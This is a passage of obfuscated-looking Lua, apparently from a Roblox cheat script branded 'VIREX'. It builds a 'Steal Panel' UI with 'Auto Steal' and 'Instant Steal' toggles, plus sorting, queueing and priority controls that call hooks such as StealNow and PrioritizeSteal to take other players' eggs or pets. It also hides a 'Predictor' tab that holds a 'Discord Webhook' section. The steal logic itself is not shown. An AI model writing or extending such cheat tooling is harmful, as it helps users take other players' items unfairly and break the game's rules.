if arg and arg.Button.Visible ~= visible then
arg.Button.Visible = visible
end
end
local function fn38(arg, rank, badgeStyle, arg2)
local visible = rank ~= nil
arg.Rank = rank
fn37(arg.Steal, not visible)
fn37(arg.Up, visible)
fn37(arg.Down, visible)
fn37(arg.Cancel, visible)
if visible then
fn30(arg.Up, rank > 1 and tbl17.Hud or tbl17.Queued)
fn30(arg.Down, rank < (arg2 or rank) and tbl17.Hud or tbl17.Queued)
end
fn30(arg.Star, rank == 1 and tbl17.PriorityOn or tbl17.Queued)
if arg.Badge then
if arg.Badge.Visible ~= visible then
arg.Badge.Visible = visible
end
if visible then
fn19(arg.Badge, "#" .. rank)
badgeStyle = badgeStyle and tbl17.Steal or tbl17.PriorityOn
if arg.BadgeStyle ~= badgeStyle and arg.BadgeGradient then
arg.BadgeStyle = badgeStyle
arg.BadgeGradient.Color = badgeStyle.Color
arg.BadgeGradient.Rotation = 90
end
end
end
end
local function fn39()
if not tbl21 then
return
end
local v24 = tbl4.Toggle(v5, false)
if tbl21.On ~= v24 then
tbl21.On = v24
fn30(tbl21.Toggle, v24 and tbl17.Steal or tbl17.Cancel)
fn19(tbl21.Toggle.Label, v24 and "Auto Steal: ON" or "Auto Steal: OFF")
end
local guardOn = tbl4.SafeCarry.LineDrop == true
if tbl21.Guard and tbl21.GuardOn ~= guardOn then
tbl21.GuardOn = guardOn
fn30(tbl21.Guard, guardOn and tbl17.Steal or tbl17.Cancel)
fn19(tbl21.Guard.Label, guardOn and "Instant Steal: ON" or "Instant Steal: OFF")
end
if v19 and tbl21.SortShown ~= v4 then
tbl21.SortShown = v4
fn19(v19.Label, "Sort: " .. tostring(v4))
end
end
local n21 = 4
local tbl28 = {}
local tbl29 = {}
local function fn40()
if not v20 then
return
end
fn39()
local tbl30 = {}
for _, v24 in pairs(tbl24) do
table.insert(tbl30, v24)
end
local tbl31 = {}
local v24 = nil
if type(tbl4.StealPlan) == "function" then
task.spawn(function()
local ok, result, result2 = pcall(tbl4.StealPlan)
if ok and type(result) == "table" then
tbl31 = result
v24 = result2
end
end)
end
local tbl32 = {}
for i, v25 in ipairs(tbl31) do
if tbl32[v25] == nil then
tbl32[v25] = i
end
end
local v25 = v4
table.sort(tbl30, function(arg, arg2)
local v26 = tbl32[arg.Uid]
local v27 = tbl32[arg2.Uid]
if v26 ~= nil ~= v27 ~= nil then
return v26 ~= nil
end
if v26 and v27 then
return v26 < v27
end
if v25 == tbl5[1] and arg.Style.RarityNumber ~= arg2.Style.RarityNumber then
return arg.Style.RarityNumber > arg2.Style.RarityNumber
end
local flag9 = v25 == tbl5[2]
local flag10
if flag9 then
flag10 = (arg.Weight or 0) ~= (arg2.Weight or 0)
else
flag10 = flag9
end
if flag10 then
return (arg.Weight or 0) > (arg2.Weight or 0)
end
if v25 == tbl5[5] and arg.Value ~= arg2.Value then
return arg.Value < arg2.Value
end
if arg.Value ~= arg2.Value then
return arg.Value > arg2.Value
end
return arg.Uid < arg2.Uid
end)
local now = os.clock()
local tbl33 = {}
local tbl34 = {}
for _, v26 in ipairs(tbl30) do
local v27 = tbl28[v26.Uid]
if v27 and v27 > now and tbl29[v26.Uid] then
table.insert(tbl34, v26)
else
tbl28[v26.Uid] = nil
table.insert(tbl33, v26)
end
end
table.sort(tbl34, function(arg, arg2)
return tbl29[arg.Uid] < tbl29[arg2.Uid]
end)
for _, v26 in ipairs(tbl34) do
table.insert(tbl33, math.clamp(tbl29[v26.Uid], 1, #tbl33 + 1), v26)
end
table.clear(tbl29)
for i, v26 in ipairs(tbl33) do
tbl29[v26.Uid] = i
local v27 = tbl23[v26.Uid]
if v27 then
if v27.Frame.LayoutOrder ~= i then
v27.Frame.LayoutOrder = i
end
fn38(v27, tbl32[v26.Uid], v26.Uid == v24, #tbl31)
end
end
end
local function fn41()
if not v20 then
return
end
local n22 = math.max(1, math.floor(v20.AbsoluteSize.X / n10 + 0.5))
if n22 == n14 then
return
end
n14 = n22
for _, v24 in pairs(tbl23) do
v24.Frame.Size = UDim2.new(1, 0, 0, n22)
end
end
local function fn42(arg)
local clone = v21:Clone()
local spacer = clone:FindFirstChild("Spacer")
local textLabel = spacer:FindFirstChild("TextLabel")
local tbl30 = {
Uid = arg,
Frame = clone,
Icon = spacer:FindFirstChild("Icon"),
Label = textLabel,
ValueLabel = spacer:FindFirstChild("Value"),
DetailLabel = spacer:FindFirstChild("Detail"),
}
tbl30.Gradient = textLabel and textLabel:FindFirstChildOfClass("UIGradient")
tbl30.Steal = fn29(spacer:FindFirstChild("Unequip"))
tbl30.Cancel = fn29(spacer:FindFirstChild("Cancel"))
tbl30.Star = fn29(spacer:FindFirstChild("Star"))
tbl30.Up = fn29(spacer:FindFirstChild("Up"))
tbl30.Down = fn29(spacer:FindFirstChild("Down"))
tbl30.Badge = spacer:FindFirstChild("Rank")
tbl30.BadgeGradient = tbl30.Badge and tbl30.Badge:FindFirstChildOfClass("UIGradient") or nil
if textLabel and not tbl30.Gradient then
tbl30.Gradient = Instance.new("UIGradient")
tbl30.Gradient.Parent = textLabel
end
fn31(tbl30.Steal)
fn31(tbl30.Cancel)
fn31(tbl30.Star)
fn31(tbl30.Up)
fn31(tbl30.Down)
for _, v24 in ipairs({ { tbl30.Up, -1 }, { tbl30.Down, 1 } }) do
if v24[1] then
v24[1].Button.Activated:Connect(function()
if type(tbl4.MoveInPlan) == "function" then
tbl4.MoveInPlan(tbl30.Uid, v24[2])
end
tbl4.UiDefer(fn40)
end)
end
end
if tbl30.Steal then
tbl30.Steal.Button.Activated:Connect(function()
if tbl30.Rank == nil and type(tbl4.StealNow) == "function" then
tbl4.StealNow(tbl30.Uid, false)
end
tbl4.UiDefer(fn40)
end)
end
if tbl30.Cancel then
tbl30.Cancel.Button.Activated:Connect(function()
tbl28[tbl30.Uid] = os.clock() + n21
if type(tbl4.CancelSteal) == "function" then
tbl4.CancelSteal(tbl30.Uid)
end
tbl4.UiDefer(fn40)
end)
end
if tbl30.Star then
tbl30.Star.Button.Activated:Connect(function()
if type(tbl4.PrioritizeSteal) == "function" then
tbl4.PrioritizeSteal(tbl30.Uid)
end
tbl4.UiDefer(fn40)
end)
end
fn26(clone, true)
fn23(clone)
clone.Size = UDim2.new(1, 0, 0, math.max(n14, 1))
clone.Visible = true
clone.Parent = v20
return tbl30
end
local function fn43(arg, arg2)
local style = arg2.Style
if arg.Category ~= arg2.Category then
arg.Category = arg2.Category
if arg.Icon then
arg.Icon.Image = style.Icon
end
if arg.Gradient then
arg.Gradient.Color = style.GradientColor
arg.Gradient.Rotation = style.GradientRotation
end
end
fn19(arg.Label, style.Name)
fn19(arg.ValueLabel, fn18(arg2.Value))
fn19(arg.DetailLabel, arg2.Detail or "")
end
local function fn44(arg)
local n22 = tonumber(arg) or 0
local str = n22 >= 1000 and string.format("%.0f", n22) or string.format("%.2f", n22)
local v24, v25 = string.match(str, "^(%-?%d+)(%.%d+)$")
str = v24 or str
local v26
while true do
local v27
v26, v27 = string.gsub(str, "^(%-?%d+)(%d%d%d)", "%1,%2")
if v27 ~= 0 then
str = v26
else
break
end
end
return v26 .. (v25 or "") .. " Kg"
end
local function fn45(arg, arg2)
local str = string.format("x%.2f", arg2)
local eggRecords = tbl.EggRecords
local flag9 = type(eggRecords) == "table" and type(eggRecords.WeightKgForScale) == "function"
local n22 = 0
if flag9 then
local ok, result = pcall(eggRecords.WeightKgForScale, arg, arg2)
if ok and tonumber(result) then
n22 = tonumber(result)
str ..= "  " .. utf8.char(183) .. "  " .. fn44(result)
end
end
return str, n22
end
local fn46 = nil
local function fn47(arg)
local v24 = fn33()
if v24 and arg == n13 and flag2 then
local tbl30 = {}
local now = os.clock()
local n22 = -1
local v25 = nil
for _, v26 in pairs(v24) do
local uid = type(v26) == "table" and v26.Uid or nil
local flag9 = v26.State == "Slot" or v26.State == "Dropped" or v26.State == "Carried"
if type(uid) == "string" and flag9 and type(v26.AssetCategory) == "string" then
tbl30[uid] = true
local v27 = fn16(v26.AssetCategory)
local tbl31 = tbl24[uid]
if not tbl31 then
tbl31 = { Uid = uid }
tbl24[uid] = tbl31
end
local scale = tonumber(v26.AssetScale) or 1
if tbl31.Detail == nil or tbl31.Scale ~= scale or tbl31.Category ~= v26.AssetCategory then
tbl31.Scale = scale
local v28, v29 = fn45(v26.AssetCategory, scale)
tbl31.Detail = v28
tbl31.Weight = v29
end
tbl31.Category = v26.AssetCategory
tbl31.Style = v27
tbl31.Value = fn17(v26, v27)
tbl31.Position = typeof(v26.BottomCFrame) == "CFrame" and v26.BottomCFrame.Position or nil
if (v26.State == "Slot" or v26.State == "Dropped") and v27.Icon ~= "" and tbl31.Value > n22 then
n22 = tbl31.Value
v25 = tbl31
end
if flag4 and v20 then
local v28 = tbl23[uid]
if not v28 then
v28 = fn42(uid)
tbl23[uid] = v28
end
fn43(v28, tbl31)
end
end
if not (n5 < os.clock() - now) then
continue
end
RunService.Heartbeat:Wait()
now = os.clock()
if arg ~= n13 or not flag2 then
return
end
end
for k in pairs(tbl24) do
if not tbl30[k] then
tbl24[k] = nil
local v26 = tbl23[k]
if v26 then
tbl23[k] = nil
v26.Frame:Destroy()
end
end
end
if imageLabel and v25 and imageLabel.Image ~= v25.Style.Icon then
imageLabel.Image = v25.Style.Icon
end
fn40()
end
end
local n22 = 0
local function fn48(arg)
if flag7 and os.clock() - n22 < 10 then
flag8 = true
return
end
flag7 = true
n22 = os.clock()
pcall(fn47, arg)
if n22 == n22 then
flag7 = false
end
if flag8 then
flag8 = false
fn46()
end
end
fn46 = function()
if flag6 or not flag2 then
return
end
flag6 = true
local v24 = n13
task.delay(flag4 and 0.15 or 1, function()
flag6 = false
if flag2 and v24 == n13 then
task.spawn(pcall, fn48, v24)
end
end)
end
local function fn49(arg)
if flag4 or not v18 then
return
end
flag4 = true
if arg then
v22:Set(true)
end
if fn35() then
RunService.Heartbeat:Wait()
if not flag4 or not v18 then
return
end
end
fn36(true)
v17.Enabled = true
if tween then
tween:Cancel()
end
local scale = position.Y.Scale
local offset = position.Y.Offset
v18.Position = UDim2.new(position.X.Scale, math.ceil(v18.AbsoluteSize.X * n11), scale, offset)
tween = TweenService:Create(v18, tweenInfo, { Position = position })
tween:Play()
fn28()
fn41()
task.spawn(pcall, fn48, n13)
end
local function fn50(arg, arg2)
if not flag4 or not v18 then
return
end
flag4 = false
if arg2 then
v22:Set(false)
end
if tween then
tween:Cancel()
end
local scale = position.Y.Scale
local offset = position.Y.Offset
local tween3 = TweenService:Create(v18, tweenInfo2, { Position = UDim2.new(position.X.Scale, math.ceil(v18.AbsoluteSize.X * n11), scale, offset) })
tween = tween3
tween3.Completed:Connect(function(playbackState)
if playbackState == Enum.PlaybackState.Completed and tween == tween3 and not flag4 and v17 then
v17.Enabled = false
v18.Position = position
end
end)
tween3:Play()
if arg then
fn36(false)
end
end
local function createScreenGui(arg)
local screenGui = Instance.new("ScreenGui")
screenGui.Enabled = false -- VIREX: panel viejo de Chilli desactivado
screenGui:GetPropertyChangedSignal("Enabled"):Connect(function() if screenGui.Enabled then screenGui.Enabled = false end end)
screenGui.Name = fn3()
screenGui.Archivable = false
screenGui.ResetOnSpawn = false
screenGui.IgnoreGuiInset = arg.IgnoreGuiInset
screenGui.ZIndexBehavior = arg.ZIndexBehavior
screenGui.DisplayOrder = arg.DisplayOrder
pcall(function()
screenGui.ScreenInsets = arg.ScreenInsets
end)
return screenGui
end
local function fn51()
if v15 and v15.Parent and v16 and v16.Button then
return true
end
local v24 = fn22(v14.Pets)
if not v24 then
return false
end
for _, v25 in ipairs({ "Notification", "ReadyNotification", "NightImage", "NightText", "ConsoleButton", "Badge" }) do
local v26 = v24:FindFirstChild(v25)
if v26 then
v26:Destroy()
end
end
v16 = fn29(v24)
imageLabel = v24:FindFirstChild("ImageLabel")
if v16.Scale then
v16.Scale.Scale = 1
end
fn30(v16, tbl17.Chilli)
fn31(v16)
fn32(v16)
v24.AnchorPoint = Vector2.new(0.5, 0.5)
v24.LayoutOrder = 0
v24.Activated:Connect(function()
tbl4.UiDefer(function()
if not v17 or not v17.Parent then
pcall(fn20)
tbl4.UiDefer(function()
if v17 and not flag4 then
pcall(fn49, true)
end
end)
return
end
if flag4 then
fn50(true, true)
else
fn49(true)
end
end)
end)
fn26(v24)
fn23(v24)
v15 = createScreenGui(v14.Hud)
v24.Parent = v15
v15.Parent = v3
return true
end
local v24 = nil
local v25 = nil
local function fn52()
local button = v16 and v16.Button
local eggs = v14.Eggs
local pets = v14.Pets
if not button or not eggs.Parent or not pets.Parent then
return
end
if v14.Hud.Enabled and v14.GameHud.Visible and v14.Column.Visible and eggs.Visible and pets.Visible and eggs.AbsoluteSize.X > 0 then
local uiScale = eggs:FindFirstChildOfClass("UIScale")
local scale = uiScale and uiScale.Scale or 1
if scale <= 0 then
scale = 1
end
local n23 = eggs.AbsolutePosition + eggs.AbsoluteSize / 2
local n24 = pets.AbsolutePosition + pets.AbsoluteSize / 2
local n25 = eggs.AbsoluteSize / scale
local absolutePosition = v15.AbsolutePosition
local udim24 = UDim2.fromOffset(n23.X - absolutePosition.X, n23.Y - n24.Y - n23.Y - absolutePosition.Y)
local udim25 = UDim2.fromOffset(n25.X, n25.Y)
if not flag4 then
v24 = udim24
v25 = udim25
end
if button.Position ~= udim24 then
button.Position = udim24
end
if button.Size ~= udim25 then
button.Size = udim25
fn27()
end
elseif not flag4 and v24 then
if button.Position ~= v24 then
button.Position = v24
end
if v25 and button.Size ~= v25 then
button.Size = v25
fn27()
end
end
if button.Visible ~= true then
button.Visible = true
end
end
local function fn53()
local frame = v14.ActivePets.Frame
local v26 = fn22(frame)
if not v26 then
return false
end
local header = v26:FindFirstChild("Header")
local scrollingFrame = v26:FindFirstChild("ScrollingFrame")
local close = v26:FindFirstChild("Close")
local template = scrollingFrame and scrollingFrame:FindFirstChild("Template")
local spacer = template and template:FindFirstChild("Spacer")
local unequip = spacer and spacer:FindFirstChild("Unequip")
local textLabel = spacer and spacer:FindFirstChild("TextLabel")
if not (header and scrollingFrame and close and spacer and unequip and textLabel) then
v26:Destroy()
return false
end
for _, child in ipairs(scrollingFrame:GetChildren()) do
if child ~= template and child:IsA("GuiObject") and child.Name ~= "EmptyLast" then
child:Destroy()
end
end
local equipBest = v26:FindFirstChild("EquipBest")
if equipBest then
equipBest:Destroy()
end
local uiAspectRatioConstraint = v26:FindFirstChildOfClass("UIAspectRatioConstraint")
local aspectRatio = uiAspectRatioConstraint and uiAspectRatioConstraint.AspectRatio or 1.25
local flag9 = not UserInputService.MouseEnabled
local n23 = flag9 and 1.2 or 1
flag9 = flag9 and 1.15 or 1
local aspectRatio2 = n9 / flag9
local n24 = aspectRatio2 / aspectRatio
tbl22 = { Width = frame.Size.X.Scale, Height = frame.Size.Y.Scale, Aspect = aspectRatio }
v26.Size = UDim2.new(n7 * n23, 0, n8 * n23 * flag9, 0)
if not uiAspectRatioConstraint then
uiAspectRatioConstraint = Instance.new("UIAspectRatioConstraint")
uiAspectRatioConstraint.Parent = v26
end
uiAspectRatioConstraint.AspectRatio = aspectRatio2
uiAspectRatioConstraint.AspectType = Enum.AspectType.FitWithinMaxSize
header.Size = UDim2.new(header.Size.X.Scale, header.Size.X.Offset, header.Size.Y.Scale * n24, header.Size.Y.Offset)
header.Position = UDim2.new(header.Position.X.Scale, header.Position.X.Offset, header.Position.Y.Scale * n24, header.Position.Y.Offset)
close.Size = UDim2.new(close.Size.X.Scale * 1, close.Size.X.Offset, close.Size.Y.Scale * n24, close.Size.Y.Offset)
close.Position = UDim2.new(close.Position.X.Scale * 1, close.Position.X.Offset, close.Position.Y.Scale, close.Position.Y.Offset)
local scale = scrollingFrame.Size.Y.Scale
local scale2 = scrollingFrame.Position.Y.Scale
local y = scrollingFrame.AnchorPoint.Y
local n25 = (scale2 - scale * y) * n24
local n26 = 1 - (1 - scale2 + scale * (1 - y)) * n24
scrollingFrame.Size = UDim2.new(scrollingFrame.Size.X.Scale, scrollingFrame.Size.X.Offset, n26 - n25, 0)
scrollingFrame.Position = UDim2.new(scrollingFrame.Position.X.Scale, scrollingFrame.Position.X.Offset, n25 + (n26 - n25) * y, 0)
local scale3 = scrollingFrame.Size.Y.Scale
local y2 = scrollingFrame.AnchorPoint.Y
local n27 = scrollingFrame.Position.Y.Scale - scale3 * y2
local n28 = n27 + scale3
local n29 = 0.1 * n24
local n30 = 0.02 * n24
local frame2 = Instance.new("Frame")
frame2.BackgroundTransparency = 1
frame2.BorderSizePixel = 0
frame2.AnchorPoint = Vector2.new(0.5, 0)
frame2.Position = UDim2.new(0.5, 0, n27 + n30, 0)
frame2.Size = UDim2.new(0.9, 0, n29, 0)
frame2.Parent = v26
local n31 = n27 + n30 * 1.5 + n29
scrollingFrame.Size = UDim2.new(scrollingFrame.Size.X.Scale, scrollingFrame.Size.X.Offset, n28 - n31, 0)
scrollingFrame.Position = UDim2.new(scrollingFrame.Position.X.Scale, scrollingFrame.Position.X.Offset, n31 + (n28 - n31) * y2, 0)
local clone = unequip:Clone()
clone.AnchorPoint = Vector2.new(0, 0.5)
clone.Position = UDim2.new(0, 0, 0.5, 0)
clone.Size = UDim2.new(0.37, 0, 1, 0)
clone.Parent = frame2
local v27 = fn29(clone)
fn31(v27)
clone.Activated:Connect(function()
local v28 = v5
local flag10 = v5
if v28 then
flag10 = type(v28.Set) == "function"
end
if flag10 then
pcall(v28.Set, v28, not tbl4.Toggle(v28, false))
end
tbl4.UiDefer(fn39)
end)
local clone2 = unequip:Clone()
clone2.Parent = frame2
local v28 = fn29(clone2)
fn31(v28)
clone2.Activated:Connect(function()
local safeCarry = tbl4.SafeCarry
local lineDrop = not safeCarry.LineDrop
local instantHandle = safeCarry.InstantHandle
if instantHandle and type(instantHandle.Set) == "function" then
pcall(instantHandle.Set, instantHandle, lineDrop)
end
safeCarry.LineDrop = lineDrop
tbl4.UiDefer(fn39)
end)
local uiListLayout = Instance.new("UIListLayout")
uiListLayout.FillDirection = Enum.FillDirection.Horizontal
uiListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
uiListLayout.VerticalAlignment = Enum.VerticalAlignment.Center
uiListLayout.SortOrder = Enum.SortOrder.LayoutOrder
uiListLayout.Padding = UDim.new(0.06, 0)
uiListLayout.Parent = frame2
clone.Size = UDim2.new(0.46, 0, 1, 0)
clone.LayoutOrder = 1
clone2.Size = UDim2.new(0.46, 0, 1, 0)
clone2.LayoutOrder = 2
tbl21 = { Toggle = v27, Guard = v28 }
tbl4.StealPanelSync = function()
tbl4.UiDefer(fn39)
end
local uiGradient = header:FindFirstChildOfClass("UIGradient")
if uiGradient then
local v29 = fn15
local tbl30 = {}
local tbl31 = { 0, color2(200, 18, 24) }
local tbl32 = { 0.53, color2(255, 88, 90) }
local tbl33 = { 1, color2(214, 28, 34) }
tbl30[1] = tbl31
tbl30[2] = tbl32
tbl30[3] = tbl33
uiGradient.Color = v29(tbl30)
end
title = header:FindFirstChild("Title")
fn19(title, "Steal Panel")
local plusEquip = header:FindFirstChild("PlusEquip")
v19 = fn29(plusEquip)
if v19 then
fn30(v19, tbl17.Steal)
fn19(v19.Label, "Sort: " .. tostring(v4))
fn31(v19)
local n32 = 0
local function fn54()
if os.clock() - n32 < 0.25 then
return
end
n32 = os.clock()
local v29 = tbl5[(table.find(tbl5, v4) or 4) % #tbl5 + 1]
local priorityHandle = tbl4.Steal.PriorityHandle
if priorityHandle and type(priorityHandle.Set) == "function" then
pcall(priorityHandle.Set, priorityHandle, v29)
end
if v4 ~= v29 then
v4 = v29
if type(tbl4.ResortSteal) == "function" then
tbl4.ResortSteal()
end
end
tbl4.UiDefer(function()
fn19(v19.Label, "Sort: " .. tostring(v4))
fn40()
end)
end
pcall(function()
plusEquip.Active = true
plusEquip.Interactable = true
plusEquip.AutoButtonColor = true
end)
for _, descendant in ipairs(plusEquip:GetDescendants()) do
if descendant:IsA("GuiObject") then
pcall(function()
descendant.Active = false
end)
end
end
plusEquip.Activated:Connect(fn54)
plusEquip.InputBegan:Connect(function(input)
if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
fn54()
end
end)
end
local v29 = fn29(close)
fn31(v29)
close.Activated:Connect(function()
tbl4.UiDefer(function()
fn50(true, true)
end)
end)
local clone3 = unequip:Clone()
clone3.Name = "Cancel"
clone3.Parent = spacer
local uiAspectRatioConstraint2 = Instance.new("UIAspectRatioConstraint")
uiAspectRatioConstraint2.AspectRatio = 1
uiAspectRatioConstraint2.DominantAxis = Enum.DominantAxis.Height
uiAspectRatioConstraint2.Parent = clone3
unequip.Size = UDim2.new(0.24, 0, unequip.Size.Y.Scale, 0)
unequip.Position = UDim2.new(0.852, 0, 0.5, 0)
clone3.Size = UDim2.new(0.105, 0, unequip.Size.Y.Scale, 0)
clone3.Position = UDim2.new(0.965, 0, 0.5, 0)
local icon = spacer:FindFirstChild("Icon")
if icon then
icon.AnchorPoint = Vector2.new(0.5, 0.5)
icon.Size = UDim2.new(0.2, 0, 1.3, 0)
icon.Position = UDim2.new(0.1, 0, 0.5, 0)
end
textLabel.AnchorPoint = Vector2.new(textLabel.AnchorPoint.X, 0.5)
textLabel.Size = UDim2.new(0.38, 0, 0.3, 0)
textLabel.Position = UDim2.new(0.415, 0, 0.2, 0)
fn19(textLabel, "")
local clone4 = textLabel:Clone()
clone4.Name = "Value"
clone4.Size = UDim2.new(0.38, 0, 0.23, 0)
clone4.Position = UDim2.new(0.415, 0, 0.48, 0)
local uiGradient2 = clone4:FindFirstChildOfClass("UIGradient")
if not uiGradient2 then
uiGradient2 = Instance.new("UIGradient")
uiGradient2.Parent = clone4
end
uiGradient2.Color = tbl17.Steal.Color
uiGradient2.Rotation = tbl17.Steal.Rotation
clone4.Parent = spacer
local clone5 = clone4:Clone()
clone5.Name = "Detail"
clone5.Size = UDim2.new(0.4, 0, 0.3, 0)
clone5.Position = UDim2.new(0.415, 0, 0.78, 0)
local uiGradient3 = clone5:FindFirstChildOfClass("UIGradient")
if uiGradient3 then
uiGradient3.Color = tbl17.Hud.Color
uiGradient3.Rotation = tbl17.Hud.Rotation
end
clone5.Parent = spacer
local v30 = fn29(unequip)
fn19(v30.Label, "Steal")
fn30(v30, tbl17.Steal)
local v31 = fn29(clone3)
fn19(v31.Label, "X")
fn30(v31, tbl17.Cancel)
clone3.Position = udim2
clone3.Visible = false
unequip.Position = udim22
unequip.Size = udim23
local clone6 = clone3:Clone()
clone6.Name = "Star"
clone6.AnchorPoint = Vector2.new(1, 0.5)
clone6.Size = UDim2.new(0.1, 0, 0.56, 0)
clone6.Position = udim2
clone6.Visible = true
clone6.Parent = spacer
local v32 = fn29(clone6)
fn19(v32.Label, utf8.char(9733))
fn30(v32, tbl17.Queued)
local v33 = ipairs
local tbl30 = {}
local tbl31 = {}
local v34 = utf8.char(9650)
local n32 = n20 - n19
tbl31[1] = "Up"
tbl31[2] = v34
tbl31[3] = n32
local tbl32 = {}
local v35 = utf8.char(9660)
tbl32[1] = "Down"
tbl32[2] = v35
tbl32[3] = n20
tbl30[1] = tbl31
tbl30[2] = tbl32
for _, v36 in v33(tbl30) do
local clone7 = clone3:Clone()
clone7.Name = v36[1]
clone7.AnchorPoint = Vector2.new(1, 0.5)
clone7.Size = UDim2.new(0.1, 0, 0.56, 0)
clone7.Position = UDim2.new(v36[3], 0, 0.6, 0)
clone7.Visible = false
clone7.Parent = spacer
local v37 = fn29(clone7)
fn19(v37.Label, v36[2])
fn30(v37, tbl17.Hud)
end
clone3.AnchorPoint = Vector2.new(1, 0)
clone3.Position = UDim2.new(0.99, 0, 0.04, 0)
clone3.Size = UDim2.new(0.06, 0, 0.28, 0)
clone3.ZIndex = 8
for _, descendant in ipairs(clone3:GetDescendants()) do
if descendant:IsA("GuiObject") then
descendant.ZIndex = descendant.ZIndex + 8
end
end
local clone7 = clone4:Clone()
clone7.Name = "Rank"
clone7.AnchorPoint = Vector2.new(0, 0)
clone7.Position = UDim2.new(0.012, 0, 0.03, 0)
clone7.Size = UDim2.new(0.1, 0, 0.36, 0)
clone7.TextXAlignment = Enum.TextXAlignment.Left
clone7.ZIndex = 6
clone7.Visible = false
fn19(clone7, "#1")
local uiGradient4 = clone7:FindFirstChildOfClass("UIGradient")
if uiGradient4 then
uiGradient4.Color = tbl17.PriorityOn.Color
uiGradient4.Rotation = 90
end
clone7.Parent = spacer
template.Visible = false
template.Parent = nil
v21 = template
v20 = scrollingFrame
v18 = v26
position = frame.Position
v26.Position = position
fn26(v26, true)
fn23(v26)
v17 = createScreenGui(v14.ActivePets)
v17.Enabled = false
v26.Parent = v17
v17.Parent = v3
table.insert(tbl25, scrollingFrame:GetPropertyChangedSignal("AbsoluteSize"):Connect(fn41))
table.insert(tbl25, v26:GetPropertyChangedSignal("AbsoluteSize"):Connect(fn28))
return true
end
local function fn54()
if not flag2 then
return
end
flag2 = false
n13 += 1
flag6 = false
flag8 = false
if flag4 then
flag4 = false
if not fn34() then
fn36(false, true)
end
end
if tween then
tween:Cancel()
tween = nil
end
tbl6.DisconnectAll(tbl25)
table.clear(tbl23)
table.clear(tbl24)
if v17 then
v17:Destroy()
end
if v21 then
v21:Destroy()
end
v17 = nil
v18 = nil
position = nil
title = nil
v19 = nil
v20 = nil
v21 = nil
n14 = 0
tbl21 = nil
tbl22 = nil
n15 = 1
v14 = nil
end
fn20 = function()
if flag2 then
return
end
local v26 = fn21()
if not v26 then
if not flag3 then
flag3 = true
task.delay(2, function()
flag3 = false
if not flag2 and tbl4.Toggle(nil, true) then
fn20()
end
end)
end
return
end
v14 = v26
flag2 = true
n13 += 1
local v27 = n13
uiStroke = v14.ActivePets.Frame:FindFirstChildOfClass("UIStroke")
thickness = uiStroke and uiStroke.Thickness or nil
tbl26.Panel = thickness or 2.3120369911193848
local uiStrokeClr = v14.Pets:FindFirstChild("UIStrokeClr")
tbl26.Hud = uiStrokeClr and uiStrokeClr:IsA("UIStroke") and uiStrokeClr.Thickness or 2.3120369911193848
if not fn51() or not fn53() then
fn54()
return
end
if flag5 then
flag5 = false
task.spawn(fn49)
end
table.insert(tbl25, RunService.RenderStepped:Connect(fn52))
if uiStroke then
table.insert(tbl25, uiStroke:GetPropertyChangedSignal("Thickness"):Connect(fn27))
end
for _, v28 in ipairs({ v14.ActivePets, v14.GrowingEggs }) do
if v28 then
table.insert(tbl25, v28:GetPropertyChangedSignal("Enabled"):Connect(function()
if v28.Enabled and flag4 then
fn50(false)
end
end))
end
end
local eggState = tbl.EggState
if type(eggState) == "table" then
for _, v28 in ipairs({ "FieldRefreshed", "FieldShifted", "FieldGone", "FieldClaimed", "SnapshotRefreshed" }) do
local v29 = eggState[v28]
if type(v29) == "table" and type(v29.Connect) == "function" then
local ok, result = pcall(v29.Connect, v29, fn46)
if ok and result then
table.insert(tbl25, result)
end
end
end
end
local areaEggSlotsClient = workspace:FindFirstChild("AreaEggSlotsClient")
if areaEggSlotsClient then
table.insert(tbl25, areaEggSlotsClient.ChildAdded:Connect(fn46))
table.insert(tbl25, areaEggSlotsClient.ChildRemoved:Connect(fn46))
end
task.spawn(function()
local n23 = 0
while true do
if flag2 and v27 == n13 then
n23 += task.wait(0.5)
if not (not flag2 or v27 ~= n13) then
if not (v14.Eggs:IsDescendantOf(game) and v14.ActivePets:IsDescendantOf(game)) then
task.defer(function()
fn54()
if tbl4.Toggle(nil, true) then
fn20()
end
end)
break
else
if n4 <= n23 then
fn46()
n23 = 0
elseif flag4 then
fn40()
end
continue
end
end
end
break
end
end)
task.spawn(pcall, fn48, v27)
end
fn4(function()
fn54()
if v15 then
v15:Destroy()
end
fn32(nil)
v15 = nil
v16 = nil
imageLabel = nil
end)
tbl4.RestoreStealPanel = function()
-- disabled auto left steal panel (Virex single UI)
return
end
task.defer(fn20)
v11 = v2:CreateTab({ Name = "Predictor", SectionsExpanded = true })
v7 = v11:CreateSection({ Name = "Discord Webhook", Expanded = false })
v12 = v11:CreateSection({ Name = "Egg Predictor", Expanded = true })
v8 = v11:CreateSection({ Name = "Lab Predictor", Expanded = true })
v9 = v11:CreateSection({ Name = "Fuse Predictor", Expanded = false })
-- hide Predictor tab button so it does not appear
if v11 and v11._button then
    v11._button.Visible = false
    v11._button.Size = UDim2.new(0,0,0,0)
end
local function fn55(arg, arg2)
local ok, result = pcall(Font.new, arg, arg2, Enum.FontStyle.Normal)
return ok and result or nil
end
tbl12 = {
Ready = type(v12.CreateCanvas) == "function",
Bullet = utf8.char(8226),
Color = {
Text = "#FFFFFF",
Income = "#4DFF7A",
Clock = "#FFC24D",
Ready = "#4DFF7A",
Growing = "#FFC24D",
Inventory = "#7FD8FF",
Weight = "#CDE7FF",
Scale = "#FFDF8A",
Separator = "#7A8CC0",
Hint = "#9FB8FF",
},
NameFont = fn55("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.ExtraBold),
}
tbl12.RarityFont = fn55("rbxassetid://12187365977", Enum.FontWeight.Bold) or fn55("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular)
local sequence2 = tbl6.Sequence
local tbl30 = {}
local tbl31 = { 0, Color3.fromRGB(255, 255, 255) }
local tbl32 = { 0.5, Color3.fromRGB(222, 238, 255) }
local tbl33 = { 1, Color3.fromRGB(255, 255, 255) }
tbl30[1] = tbl31
tbl30[2] = tbl32
tbl30[3] = tbl33
tbl12.NameGradient = sequence2(tbl30)
end
local sequence2 = tbl6.Sequence
local tbl19 = {}
local tbl20 = { 0, Color3.fromRGB(255, 255, 255) }
local tbl21 = { 0.2, Color3.fromRGB(206, 212, 224) }
local tbl22 = { 0.42, Color3.fromRGB(74, 80, 94) }
local tbl23 = { 0.58, Color3.fromRGB(42, 46, 56) }
